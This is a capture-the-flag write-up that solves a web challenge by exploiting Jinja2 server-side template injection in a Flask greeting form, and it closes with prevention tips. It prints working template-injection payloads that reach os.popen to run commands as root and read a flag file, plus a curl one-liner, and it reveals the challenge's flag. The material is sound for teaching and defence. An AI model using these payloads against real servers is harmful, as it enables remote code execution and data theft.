# OTP - Server Side Template Injection (SSTI)

## Challenge Info
- **URL:** http://chall.0xfun.org:30233/
- **Category:** Web
- **Description:** Just a simple service made using Server Side Rendering.

## Solution

### Step 1: Reconnaissance

The challenge presents a simple "Greeting Service" with a form that takes a name input:

```html
<form method="POST">
    <input type="text" name="name" placeholder="Enter your name" required>
    <input type="submit" value="Greet Me!">
</form>
```

Submitting `test` returns `test` directly, indicating the input is reflected in the response.

### Step 2: Identifying SSTI

Since the challenge mentions "Server Side Rendering," I tested for Server-Side Template Injection (SSTI).

**Test payload:**
```
{{7*7}}
```

**Response:**
```
49
```

The server evaluated `7*7` and returned `49`, confirming Jinja2 SSTI vulnerability.

### Step 3: Confirming Flask/Jinja2

Accessing the Flask config object:

```
{{config}}
```

Response confirmed Flask configuration, revealing this is a Flask application using Jinja2 templates.

### Step 4: Achieving RCE

Using Jinja2's `cycler` object to access Python's `os` module:

```
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Response:**
```
uid=0(root) gid=0(root) groups=0(root)
```

RCE achieved as root!

### Step 5: Finding the Flag

Listed files in `/app`:
```
{{cycler.__init__.__globals__.os.popen('ls -la /app').read()}}
```

Found `flag.txt`, then read it:
```
{{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}
```

## Flag
```
0xfun{Server_Side_Template_Injection_Awesome}
```

## Exploit One-Liner

```bash
curl -s -X POST --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}" "http://chall.0xfun.org:30233/"
```

## Key Concepts

- **SSTI (Server-Side Template Injection):** Occurs when user input is embedded directly into a template without proper sanitization
- **Jinja2:** Python templating engine used by Flask
- **Exploit Chain:** `cycler` → `__init__` → `__globals__` → `os` → `popen()` → RCE

## Prevention

1. Never pass user input directly to `render_template_string()`
2. Use `render_template()` with separate template files
3. Sanitize/escape user input before rendering
4. Use sandboxed Jinja2 environment
